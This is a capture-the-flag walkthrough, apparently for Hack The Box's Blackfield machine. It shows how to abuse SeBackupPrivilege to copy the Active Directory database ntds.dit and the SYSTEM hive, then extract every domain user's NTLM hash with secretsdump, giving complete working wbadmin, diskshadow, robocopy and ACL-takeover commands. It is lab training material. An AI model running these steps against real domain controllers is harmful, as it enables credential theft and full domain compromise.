
# Elevating Privilege svc_backup -> Administrator

## Enumeration
Looking at the privileges of our user we find **SeBackupPrivilege** & **SeRestoreePrivilege** which are very powerful privileges that allows the user to access directories/files that he doesn’t own or doesn’t have permission to.
> This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.

```console
*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```
The user **svc_backup** is a member of **Backup Operators Groups** and hence has the **Backup privileges** which allows him to backup and restore files on the system, read and write files on the system.

```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
### Attack Scenario
- Grab a copy of **NTDS.dit** file, a database that stores Active Directory users credentials.
- Next, we will grab **SYSTEM hive** file which contains System boot key essential to decrypt the NTDS.dit
- Using Impacket’s secretsdump script to extract NTLM hashes of all the users in the domain from NTDS.dit

## PrivEsc Method #1 - wbadmin

For the first method, we will use **wbadmin** a Windows command line tool which enables us back up and restore operating system, volumes, files, folders, and applications.

It is not recommended to Backup and Restore the file in the same disk, so first we will first create a shadow copy of disk and backup the **ntds.dit** from the **c:\windows\ntds\ntds.dit** and store it inside SMB share **C$**

We could also achieve this by hosting our own SMB share from our machine but I preferred using SMB share **C$** of the host itself, since we don’t have an interactive session we’ll be using **-quiet** flag which wont ask us for user input to start the backup operation.

### NTDS.dit
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd \\10.10.10.192\C$\Windows\Temp
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.192\C$\Windows\Temp> mkdir CFX
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.10.192\C$\Windows\Temp\CFX> wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:c:\Windows\ntds\ntds
.dit -quiet
```
Now that we have obtained **WindowsImageBackup** of **NTDS.dit** file inside the SMB share, we’ll recovery the file inside our directory **C:\Users\svc_backup\Documents**

For recovering the backup we need the backup version:
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin get versions
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 10/5/2020 3:27 PM
Backup location: Network Share labeled \\10.10.10.192\C$\Windows\Temp\CFX\
Version identifier: 10/05/2020-22:27
Can recover: Volume(s), File(s)

*Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start recovery -version:10/05/2020-22:27 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup\Documents -notrestoreacl -quiet

*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         10/5/2020  3:27 PM       18874368 ntds.dit
```
### SYSTEM hive
To extract the NTLM hashes from ntds.dit file, we’ll be needing SYSTEM hive file which contains the System boot key essential to decrypt the NTDS.dit.

Grabbing **SYSTEM**:
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM
```
### Extracting NTLM hashes
We got both the files required to extract NTLM hashes of Domain accounts using Impacket’s secretsdump.py:
```console
┌─[✗]─[kimkhuongduy@drgon]─[~/Documents/hackthebox/Blackfield]
└──╼ $secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## PrivEsc Method #2 - diskshadow
In second method, the strategy would be the same to grab **NTDS.dit**, but instead we’ll use a different windows tool named **diskshadow**.

> Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS). This is a built-in function of Windows that can help us create a copy of a drive that is currently in use. 

First, we will be creating a **Distributed Shell File** or a **dsh** file which will consist of all the commands that are required by the diskshadow to run and create a full copy of our Windows Drive which we then can use to extract the **ntds.dit** file from. In this file, we are instructing the **diskshadow** to create a copy of the **C:** Drive into a **w:** Drive with **mydrive** as its alias. The Drive Alias and Character can be anything you want. After creating this dsh file, we need to use the **unix2dos** to convert the encoding and spacing of the dsh file to the one that is compatible with the Windows Machine.
```console
set context persistent nowriters
add volume c: alias mydrive
create
expose %mydrive% w:
```
In local machine:
```console
┌─[kimkhuongduy@drgon]─[~/Documents/hackthebox/Blackfield]
└──╼ $unix2dos shadow.dsh
```
 *Usually upload to folder C:\Windows\Temp*
 
Then execute the diskshadow and using the script file as its inputs.
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s shadowscript.dsh
```

Now, to perform the task of copying the data of the NTDS.dit file, there are two ways to do it:
- robocopy
- Copy-FileSeBackupPrivilege

### robocopy

I’ll now copy the file using **robocopy** with **/B** flag to ignore file permissions and use a new directory new_ntds to save the file:
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /B w:\Windows\ntds .\new_ntds ntds.dit
```
### Copy-FileSeBackupPrivilege
An alternate way to copy files from the shadow drive **w:\** is by uploading **SeBackupPrivilegeUtils.dll** and **SeBackupPrivilegeCmdLets.dll** from [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) repo and importing them to our session.
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload SeBackupPrivilegeUtils.dll
```
Importing dll’s:
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
Now we can use **Copy-FileSeBackupPrivilege** to copy files from our Shadow drive to the desired directory:
```console
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Copy-FileSeBackupPrivilege w:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Documents\ntds.dit
```
> NOTE: In the case of a DC, the privilege only allows you to make **BACKUPS NOT COPIES**. In a standalone system, we can make copies of the files (SAM and SYSTEM hive). In the case of DC, the method differs as now we need to make backups of the **NTDS.dit** and **SYSTEM** files to extract the password hash of users.
## Additional
There is another way that still involves the **SeBackupPrivilege** and **SeRestorePrivilege**. It’s to modify **ACL** and grant myself *full access* to the file/folder I specified using [this PowerShell script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1). In the following, I use that script to own the entire admin’s desktop folder.
```console
*Evil-WinRM* PS C:\Users\svc-printer\chrp> Import-Module .\Acl-FullControl.ps1
*Evil-WinRM* PS C:\Users\svc-printer\chrp> Acl-FullControl -user return\svc-printer -path c:\users\administrator\desktop
```
The [anti script](https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1) to revert
```console
*Evil-WinRM* PS C:\Users\svc-printer\chrp> Acl-RevokeFullControl -User return\svc-printer -Path C:\users\administrator\desktop
```
